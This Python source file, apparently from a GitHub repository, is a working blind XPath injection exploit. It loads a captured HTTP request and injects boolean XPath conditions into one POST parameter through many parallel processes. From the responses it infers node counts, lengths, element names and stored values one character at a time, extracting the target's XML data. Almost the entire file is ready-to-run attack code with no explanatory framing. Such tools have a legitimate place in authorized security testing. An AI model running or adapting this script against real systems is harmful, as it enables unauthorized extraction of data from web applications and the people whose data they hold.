##
## https://github.com/Ressurect0/blind_xpath_exploit/blob/master/xpath_d2.py
##

import requests
import sys
from urllib.parse import unquote,quote
import multiprocessing

headers=dict()
post_parameters=dict()
cookies=dict()
iparam=sys.argv[1]
true_string=sys.argv[2].strip("\"")
element_range = 20
element_length = 40
value_length = 40
data_length=40

req = open("request.r","r").read().split("\n")
url = "https://" + req[1].split(": ")[1] + req[0].split(" ")[1]

for i in range(2,len(req)):
    if req[i] == "":
        post_body = req[i+1]
        break
    temp = req[i].split(": ")
    headers[temp[0]] = temp[1]


for i in post_body.split("&"):
    temp = i.split("=",1)
    post_parameters[temp[0]] = unquote(temp[1])

cookies["a"]="b"

headers.pop("Cookie")
headers.pop("Content-Length")

def true_condition(resp):
    if (str(resp).find(true_string) != -1):
        return 1
    else:
        return 0

sess = []

def mp(inject,i,q):
    post_parameters[iparam] = unquote(inject)
    r = requests.post(url, data=post_parameters, headers=headers, cookies=cookies)
    if(true_condition(r.content)):
        q.append(i)

def mp_len(inject,i,j,q):
    post_parameters[iparam] = unquote(inject)
    r = requests.post(url, data=post_parameters, headers=headers, cookies=cookies)
    if(true_condition(r.content)):
        temp=[]
        temp.append(j)
        temp.append(i)
        q.append(temp)

def mp_tag(inject,m,k,q):
    post_parameters[iparam] = unquote(inject)
    r = requests.post(url, data=post_parameters, headers=headers, cookies=cookies)
    if (true_condition(r.content)):
        temp = []
        temp.append(m)
        temp.append(k)
        q.append(temp)


def engine(prefix,level):
    jobs = []
    # No. of child elements
    q = multiprocessing.Manager().list()
    for i in range(1,element_range+1):
        orig = post_parameters[iparam]
        inject = orig + " and name("+prefix+"/*["+str(i)+"])"
        p = multiprocessing.Process(target=mp, args=(inject,i,q))
        jobs.append(p)
        p.start()
        # nlen=i
    for job in jobs:
        job.join()
    try:
        nlen = max(q)
    except:
        nlen = 0
    print("No. of nodes at level "+str(level) + ":" + str(nlen))
    post_parameters[iparam] = orig

    # String length of each element
    slen = []
    jobs = []
    qt = multiprocessing.Manager().list()
    for j in range(1, nlen + 1):
        orig = post_parameters[iparam]
        for i in range(1, element_length):
            inject = orig + " and string-length(name(" + prefix + "/*[" + str(j) + "]))=" + str(i)
            p = multiprocessing.Process(target=mp_len,args=(inject,i,j,qt))
            jobs.append(p)
            p.start()
    for job in jobs:
        job.join()
    qt.sort()
    for a in qt:
        slen.append(a[1])
        #print("String length of node" + str(a[0]) + " at level " + str(level) + ":" + str(a[1]))
        # try:
        #     slen.append(max(qt))
        # except:
        #     slen.append(0)
        # print("String length of node" + str(j) + " at level " + str(level) + ":" + str(slen[j-1]))

    # Name and Data of each element
    chars = open("char", "r").read().split("\n")[:-1]
    for j in range(0, nlen):
        qt2 = multiprocessing.Manager().list()
        for m in range(1, slen[j] + 1):
            jobs = []
            for k in chars:
                inject = orig + " and substring(name(" + prefix + "/*[" + str(j + 1) + "])," + str(
                    m) + ",1)='" + k + "'"
                p = multiprocessing.Process(target=mp_tag,args=(inject,m,k,qt2))
                jobs.append(p)
                p.start()
        for job in jobs:
            job.join()
        qt2.sort()
        nn = ""
        for l1 in qt2:
            nn+=str(l1[1])
        print(nn)

        #Data
        jobs = []
        # Value Length
        qt5 = multiprocessing.Manager().list()
        for i in range(1, value_length+1):
            orig = post_parameters[iparam]
            inject = orig + " and string-length(" + prefix + "/*["+str(j+1)+"])=" + str(i)
            p = multiprocessing.Process(target=mp, args=(inject, i, qt5))
            jobs.append(p)
            p.start()
        for job in jobs:
            job.join()
        # print(list(qt5))
        if list(qt5) == []:
            vlen=0
        else:
            vlen= max(qt5)
        # print("Value string length : " + str(vlen))
        post_parameters[iparam] = orig

        # Value Name
        qt3 = multiprocessing.Manager().list()
        jobs = []
        for u in range(1, vlen+1):
            for k in chars:
                inject = orig + " and substring(" + prefix + "/*["+str(j+1)+"]," + str(u) + ",1)='" + k + "'"
                p = multiprocessing.Process(target=mp_tag, args=(inject, u, k, qt3))
                jobs.append(p)
                p.start()
        for job in jobs:
            job.join()
        qt3.sort()
        nn = ""
        for l1 in qt3:
            nn += str(l1[1])
        print("\t",nn)

        # level += 1
        # prefix += "/*"

prefix = sys.argv[3].strip("\"")
level=1
# prefix =""
engine(prefix,level)

# for i in range(20):
#     sess.append(session.get('http://httpbin.org/get'))
# for i in range(20):
#     print(sess[i].result().content)
